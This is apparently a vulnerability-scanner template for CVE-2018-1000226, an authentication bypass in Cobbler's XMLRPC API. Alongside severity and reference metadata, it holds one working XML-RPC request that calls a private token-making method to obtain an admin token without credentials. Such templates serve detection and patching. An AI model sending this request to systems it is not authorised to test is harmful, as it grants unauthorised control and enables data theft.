id: CVE-2018-1000226
info:
  name: Cobbler - Authentication Bypass
  author: c-sh0
  description: Cobbler versions 2.6.11+, but code inspection suggests at least 2.0.0+
    and possibly even older versions, may be vulnerable to an authentication bypass
    vulnerability in XMLRPC API (/cobbler_api) that can result in privilege escalation,
    data manipulation or exfiltration, and LDAP credential harvesting. This attack
    appear to be exploitable via "network connectivity". Taking advantage of improper
    validation of security tokens in API endpoints. Please note this is a different
    issue than CVE-2018-10931.
  severity: critical
  remediation: 'Apply the latest security patches or updates provided by the vendor
    to fix the authentication bypass vulnerability in Cobbler.

    '
  reference:
  - https://github.com/cobbler/cobbler/issues/1916
  - https://movermeyer.com/2018-08-02-privilege-escalation-exploits-in-cobblers-api/
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000226
  - https://github.com/ARPSyndicate/kenzer-templates
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-1000226
    cwe-id: CWE-732
    epss-score: 0.01309
    epss-percentile: 0.8563
    cpe: cpe:2.3:a:cobblerd:cobbler:*:*:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: cobblerd
    product: cobbler
  tags: cve2018,cve,cobbler,auth-bypass,cobblerd
traps:
- request:
    method: POST
    path: /cobbler_api
    headers:
      Content-Type: text/xml
    body: |
      <?xml version='1.0'?>
      <methodCall>
        <methodName>_CobblerXMLRPCInterface__make_token</methodName>
        <params>
          <param>
            <value>
              <string>cobbler</string>
            </value>
          </param>
        </params>
      </methodCall>
  response:
    status_code: 200
    headers: {}
    body: <methodResponse>(.*[a-zA-Z0-9].+==)</string></value>
